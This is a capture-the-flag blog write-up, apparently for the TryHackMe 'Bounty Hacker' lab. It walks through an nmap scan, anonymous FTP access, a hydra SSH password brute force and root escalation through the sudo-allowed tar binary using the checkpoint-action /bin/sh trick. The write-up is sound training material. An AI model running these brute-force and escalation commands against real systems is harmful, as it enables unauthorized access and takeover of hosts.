<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/bounty_hacker/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
       <meta property="og:title" content="Bounty_hacker.sh" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/bounty_hacker/" /><meta property="article:published_time" content="2020-10-02T16:10:45-04:00" />



<meta name="twitter:title" content="Bounty_hacker.sh"/>
<meta name="twitter:description" content="You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!"/>

</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/bounty_hacker'>bounty_hacker</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>Bounty_hacker.sh</h1>
Oct. 2, 2020


<br/><br/>
<img src="../img/bountyHacker_cover.gif" alt="Post Cover Gif animation";>
<br/><br/>
<h2 id="bounty-hacker---thm-room">Bounty Hacker - THM Room</h2>
<p>Hello interweb readers! I&rsquo;ve felt like doing a quick box since I&rsquo;m quite busy with work these days and its hard to find time to do longer boxes. Anyways, this time I went for &lsquo;Bounty Hacker&rsquo; TryhackMe&rsquo;s room. This is a writeup detailing all my process to root this room, flaws and all. I embrace mistakes and try to learn from them, therefore this post also includes my failed attempts. You have been warned :)</p>
<p>PS: The challenge was to have this box rooted and half documented at the very least during my lunch break and finish the quick writeup later today. Spoiler alert: I was able to, and I&rsquo;m super happy about it.</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/cowboyhacker">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules.</li>
</ul>
<h3 id="recon-nmap-scan">Recon: Nmap scan</h3>
<p>We start as usual firing up nmap and running a scan, notice I initially tested the target to see if it responded to ping and it did. Otherwise, I would&rsquo;ve added <code>-Pn</code> switch to nmap to avoid pinging the target. So I ran this: <code>sudo nmap -sV -sC -T4 -A -p- 10.10.38.249</code></p>
<p>While nmap runs I usually open the target IP in the browser to see if anything is being served as a webpage:</p>
<p>Turns out we do have something, they are teasing us a bit with the story behind this room. Which seems related to the popular <code>Cowboy bebop</code> anime. Which also has AN AMAZING SOUNDTRACK!</p>
<p><img src="https://i.imgur.com/CTE4wsW.png" alt="Page served"></p>
<p>Before we move to our friend <code>nmap</code> allow me to add some music to the post, I truly think Cowboy Bebop&rsquo;s OST is awesome. Let&rsquo;s hit play on this song and move on with the hacking:</p>
<blockquote>
<p><strong>SEATBELTS</strong> - <strong>Tank!</strong> - <strong>Cowboy Bebop OST</strong> - <strong>Written by Yoko Kanno</strong>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/n2rVnRwW0h8" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

Crank that volume up!</p>
</blockquote>
<p>Ok enough fooling around, let&rsquo;s see what that nmap scan returned:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo nmap -sV -sC -T4 -A -p- 10.10.38.249
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-10-02 13:10 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.38.249
Host is up <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">55529</span> filtered ports, <span style="color:#ae81ff">10003</span> closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
|_Can<span style="color:#e6db74">&#39;t get directory listing: TIMEOUT
</span><span style="color:#e6db74">| ftp-syst: 
</span><span style="color:#e6db74">|   STAT: 
</span><span style="color:#e6db74">| FTP server status:
</span><span style="color:#e6db74">|      Connected to ::ffff:10.13.0.34
</span><span style="color:#e6db74">|      Logged in as ftp
</span><span style="color:#e6db74">|      TYPE: ASCII
</span><span style="color:#e6db74">|      No session bandwidth limit
</span><span style="color:#e6db74">|      Session timeout in seconds is 300
</span><span style="color:#e6db74">|      Control connection is plain text
</span><span style="color:#e6db74">|      Data connections will be plain text
</span><span style="color:#e6db74">|      At session startup, client count was 1
</span><span style="color:#e6db74">|      vsFTPd 3.0.3 - secure, fast, stable
</span><span style="color:#e6db74">|_End of status
</span><span style="color:#e6db74">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
</span><span style="color:#e6db74">| ssh-hostkey: 
</span><span style="color:#e6db74">|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
</span><span style="color:#e6db74">|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
</span><span style="color:#e6db74">|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
</span><span style="color:#e6db74">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span style="color:#e6db74">|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
Aggressive OS guesses: HP P2000 G3 NAS device <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 2.6.32 - 3.1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Ubiquiti AirOS 5.5.9 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Ubiquiti Pico Station WAP <span style="color:#f92672">(</span>AirOS 5.2.6<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 2.6.32 - 3.13 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 3.0 - 3.2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Infomir MAG-250 set-top box <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Ubiquiti AirMax NanoStation WAP <span style="color:#f92672">(</span>Linux 2.6.32<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 3.7 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Network Distance: <span style="color:#ae81ff">4</span> hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   226.02 ms 10.13.0.1
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
<span style="color:#ae81ff">4</span>   364.92 ms 10.10.38.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1957.43 seconds
</code></pre></div><h3 id="ftp-access">FTP Access</h3>
<p>One of the results we got brack from the nmap scan, is that the target has an FTP service with anonymous access enabled. Let&rsquo;s try that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bountyHacker<span style="color:#f92672">]</span>
└─$ ftp 10.10.38.249                                                              
Connected to 10.10.38.249.
<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
Name <span style="color:#f92672">(</span>10.10.38.249:kali<span style="color:#f92672">)</span>: anonymous
<span style="color:#ae81ff">230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -al
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">07</span> 21:47 .
drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">07</span> 21:47 ..
-rw-rw-r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">418</span> Jun <span style="color:#ae81ff">07</span> 21:41 locks.txt
-rw-rw-r--    <span style="color:#ae81ff">1</span> ftp      ftp            <span style="color:#ae81ff">68</span> Jun <span style="color:#ae81ff">07</span> 21:47 task.txt
<span style="color:#ae81ff">226</span> Directory send OK.
ftp&gt; 
</code></pre></div><p>It seems we have two files in the FTP server. We download both using <code>get {file_name}</code> command. If we then open both files we see some interesting data on each of them:</p>
<ul>
<li><strong>task.txt</strong> : Mentions some task to be performed, and the message is signed by someone named <code>lin</code></li>
<li><strong>locks.txt</strong> : Contains a list of possible usernames, or maybe passwords listed one-per-line.</li>
</ul>
<p>Let&rsquo;s see if we can use that information next.</p>
<h3 id="bruteforcing-hydra">Bruteforcing: hydra</h3>
<p>At this point, I initially fired up hydra with the <code>locks.txt</code> as username list and <code>rockyou.txt</code> as the wordlist. That didn&rsquo;t work. Then I tried using the the user mentioned in the <code>task.txt</code> file <code>lin</code> and instead of using <code>rockyou.txt</code> as wordlist and I used <code>locks.txt</code> instead. That took a while but it worked:</p>
<p>We brute-force the SSH login using <code>lin</code> as username and the <code>locks.txt</code> file as the wordlist:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">hydra -l lin -P locks.txt 10.10.38.249 ssh 
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-10-02 15:52:26
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">26</span> login tries <span style="color:#f92672">(</span>l:1/p:26<span style="color:#f92672">)</span>, ~2 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.38.249:22/
<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.38.249   login: lin   password: THM<span style="color:#f92672">{</span>REDACTED_HAVE_FUN<span style="color:#f92672">}</span>
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">4</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">4</span> targets did not resolve or could not be connected
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-10-02 15:52:43
</code></pre></div><h3 id="ssh-access">SSH Access</h3>
<p>Once <code>hydra</code> managed to brute-force his way in, we log in using lin&rsquo;s credentials and locate the <code>user.txt</code> flag. Which is conveniently located at the same directory we land after login.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bountyHacker<span style="color:#f92672">]</span>
└─$ ssh lin@10.10.38.249                                                                                                                  
The authenticity of host <span style="color:#e6db74">&#39;10.10.38.249 (10.10.38.249)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.38.249<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
</span><span style="color:#e6db74">lin@10.10.38.249&#39;</span>s password: 
Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-101-generic x86_64<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style="color:#ae81ff">83</span> packages can be updated.
<span style="color:#ae81ff">0</span> updates are security updates.

Last login: Sun Jun  <span style="color:#ae81ff">7</span> 22:23:41 <span style="color:#ae81ff">2020</span> from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM<span style="color:#f92672">{</span>REDACTED_HAVE_FUN<span style="color:#f92672">}</span>
lin@bountyhacker:~/Desktop$ 
</code></pre></div><h3 id="we-check-current-user-permissions">We check current user permissions</h3>
<p>We need now, to see how we can escalate privileges so we can get the root flag. We start by checking what is the access level of the current user. We doe <code>sudo -l</code> to see if we have access to anything as sudo (root)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">lin@bountyhacker:/tmp$ sudo -l
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> lin: 
Matching Defaults entries <span style="color:#66d9ef">for</span> lin on bountyhacker:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User lin may run the following commands on bountyhacker:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /bin/tar
lin@bountyhacker:/tmp$ 

</code></pre></div><p>It seems the user is allowed to run <code>tar</code> as root. Let&rsquo;s see if we find any way to exploit that. A good place to look is at GTFObins page.
They have an entry for <code>tar</code> <a href="https://gtfobins.github.io/gtfobins/tar/">here</a>.</p>
<p>We are offered a couple of options, the first one is trying to run this command: <code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code> in our case since we know we can run <code>tar</code> as <code>sudo</code> we do that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">lin@bountyhacker:/tmp$ sudo tar -cf /dev/null /dev/null --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>/bin/sh
tar: Removing leading <span style="color:#e6db74">`</span>/<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
<span style="color:#75715e"># whoami</span>
root
<span style="color:#75715e"># </span>

</code></pre></div><p>And we got root, now we just need to locate the root.txt flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># cd root</span>
<span style="color:#75715e"># ls</span>
root.txt
<span style="color:#75715e"># cat root.txt</span>
THM<span style="color:#f92672">{</span>REDACTED_HAVE_FUN<span style="color:#f92672">}</span>
<span style="color:#75715e"># </span>

</code></pre></div><p>That&rsquo;s it. We rooted the box and with just enough time left on my lunch break so I can get some coffee before getting back to work.
I hope you enjoyed this quick room as I did.</p>
<p>Thank you and Happy hacking!</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>



        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> with
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
</div>

    </div>
  </body>
</html>
